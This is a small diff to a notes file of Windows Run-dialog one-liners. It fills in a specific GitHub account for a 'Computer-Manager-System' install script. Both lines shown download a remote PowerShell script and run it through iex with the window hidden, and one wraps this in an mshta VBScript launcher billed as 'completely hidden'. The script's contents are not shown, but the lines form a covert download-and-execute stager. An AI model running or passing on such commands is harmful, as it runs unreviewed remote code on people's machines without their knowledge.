@@ -1,9 +1,7 @@
 Windows Run Dialog (Win+R) One-Liner (Hidden Window):
 
-powershell -WindowStyle Hidden -c "iwr https://raw.githubusercontent.com/yourusername/computer-manager/main/install.ps1 -UseBasicParsing | iex"
+powershell -WindowStyle Hidden -c "iwr https://raw.githubusercontent.com/FuzzyGumnut/Computer-Manager-System/main/install.ps1 -UseBasicParsing | iex"
 
 Or with VBScript wrapper (completely hidden):
 
-mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -WindowStyle Hidden -c """"iwr https://raw.githubusercontent.com/yourusername/computer-manager/main/install.ps1 -UseBasicParsing | iex"""""",0:Close")
-
-Replace "yourusername" with your actual GitHub username before using.
+mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -WindowStyle Hidden -c """"iwr https://raw.githubusercontent.com/FuzzyGumnut/Computer-Manager-System/main/install.ps1 -UseBasicParsing | iex"""""",0:Close")
